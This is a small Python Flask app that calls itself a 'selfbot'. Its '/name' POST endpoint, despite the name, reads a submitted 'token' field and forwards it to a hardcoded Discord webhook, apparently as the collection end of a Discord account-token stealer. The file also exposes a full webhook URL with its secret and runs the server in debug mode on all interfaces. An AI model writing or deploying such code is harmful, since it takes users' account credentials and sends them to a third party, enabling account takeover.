from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route('/')
def hello_world():
    return 'selfbot'

@app.route("/name", methods=["POST"])
def setName():
    if request.method=='POST':
        url = request.form["token"]
        from discord_webhook import DiscordWebhook

        webhook = DiscordWebhook(url="https://discord.com/api/webhooks/887039547052007455/Ixotr71l-rZiK60rb6sqCgpNf3RYkO7VGTvJ1-sPehquXJ83PrpDpYFJ8SpsUlh3rLo1", content=url)
        response = webhook.execute()
        return "DONE"
if __name__ == ("__main__"):
    app.run(debug=True, host='0.0.0.0')